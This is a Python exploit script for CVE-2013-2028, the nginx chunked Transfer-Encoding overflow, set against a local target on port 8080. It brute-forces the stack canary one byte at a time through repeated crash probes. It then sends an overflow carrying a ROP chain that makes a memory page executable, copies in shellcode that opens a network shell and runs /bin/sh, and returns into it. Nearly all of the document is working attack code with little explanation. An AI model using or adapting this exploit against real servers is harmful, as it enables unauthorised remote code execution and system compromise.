# -*- coding: utf-8 -*-

###########################################################################################
# CVE-2013-2028
# Environment : NX, ASLR, Canary
# Coded by dokydoky
# I used the ROP Gagdet of https://github.com/danghvu/nginx-1.4.0/blob/master/exp-nginx.rb
# I also refered to following article to bypass the Canary (Thanks!)
# http://www.vnsecurity.net/research/2013/05/21/analysis-of-nginx-cve-2013-2028.html
###########################################################################################

import socket
import struct
import sys
import time
from pwn import *

shellcode = (
    '\x6A\x29\x58\x6A\x02\x5F\x6A\x01\x5E\x99\x0F\x05\x52\xBA\x01\x01' +
    '\x01\x01\x81\xF2\x03\x01\x31\x38\x52\x6A\x10\x5A\x48\x89\xC5\x48' +
    '\x89\xC7\x6A\x31\x58\x48\x89\xE6\x0F\x05\x6A\x32\x58\x48\x89\xEF' +
    '\x6A\x01\x5E\x0F\x05\x6A\x2B\x58\x48\x89\xEF\x31\xF6\x99\x0F\x05' +
    '\x48\x89\xC5\x6A\x03\x5E\x48\xFF\xCE\x78\x0B\x56\x6A\x21\x58\x48' +
    '\x89\xEF\x0F\x05\xEB\xEF\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01' +
    '\x01\x01\x31\xD2\x52\x6A\x08\x5A\x48\x01\xE2\x52\x48\x89\xE2\x6A' +
    '\x68\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x2F\x73\x50\x6A\x3B\x58\x48' +
    '\x89\xE7\x48\x89\xD6\x99\x0F\x05'
)

mmap64 = 0x4026d0
mmapgot = 0x679288
mmapaddr = 0x410000
noUse = 0xFFFFFFFFFFFFFFFF

# System call table of 'sys_mprotect' 
#   %rdi = unsigned long start = mmapaddr
#   %rsi = size_t len = 0x1000
#   %rdx = unsigned long prot = 7

chain = [
    0x004136a6,			# pop rax ; add rsp, 0x08 ; ret 
    0x60,			# an offset between mmap64, mprotect
    noUse,
    0x0044b277,			# pop rdi ; ret
    mmapgot,			
    0x0045bb54,			# add byte [rdi], al ; mov eax, 0x00000000 ; ret  
    
    0x004136a6,			# pop rax ; add rsp, 0x08 ; ret 
    mmapgot,			# For next Instruction "xor byte [rax-0x77], cl"
    noUse,
    0x0041aebe,			# pop rdx ; xor byte [rax-0x77], cl ; ret 
    0x7,
    0x00442f87,			# pop rsi ; ret  
    0x1000,
    0x0044e6a8,			# pop rdi ; ret 
    mmapaddr,
    mmap64
]
ropchain = ''.join(struct.pack('<Q', _) for _ in chain)

for i in range(0,len(shellcode),8):
    code = shellcode[i:i+8]
    chain = [
        0x004136a6,			# pop rax ; add rsp, 0x08 ; ret 
	mmapaddr+i,			# dst
        noUse,
        0x00442f87,			# pop rsi ; ret  
	struct.unpack('<Q', code)[0],	# src : shellcode chunk(8byte)
	0x00428eeb			# mov qword [rax], rsi ; mov eax, 0x00000000 ; ret
    ]
    ropchain += ''.join(struct.pack('<Q', _) for _ in chain)

ropchain += struct.pack('<Q', mmapaddr)		# return to mmapaddr

ChunkSize = '8000000000000000'
dataBeforeCookie = "A"*5043

payload = '''GET / HTTP/1.1\r
Host: 127.0.0.1:8080\r
Transfer-Encoding: chunked\r\n\r
{} {}'''.format(ChunkSize, dataBeforeCookie)

HOST = '127.0.0.1'
PORT = 8080

def isCrash(l):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST,PORT))
    c = ''.join(struct.pack('B', _) for _ in l)
    s.sendall(payload+c)
    tmp = s.recv(500).strip()
    s.close()

    return (len(tmp) is 0)

def checkOneByte(cookie, j):
    l = cookie+[j]
    if not isCrash(l) and not isCrash(l) and not isCrash(l) and \
        not isCrash(l) and not isCrash(l):
        return True

    return False


if __name__ == "__main__":
    if len(sys.argv) == 2:
	cookie = sys.argv[1].decode('hex')

        payload += cookie 
        payload += "A"*24
        payload += ropchain
    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST,PORT))
        s.sendall(payload)

    else:
        cookie = list()
        for i in range(0, 8): 
            for j in range(0, 256):
                if checkOneByte(cookie, j):
                    print "============================================"
                    print "The {:d} byte is \\x{:02X}".format(i, j)
                    cookie.append(j)
                    break
	        if j is 255:
                    print "Brute Force Failed!! Try again"
                    sys.exit(1)
    
        print "stack cookie is", "".join(['{:02X}'.format(i) for i in cookie])




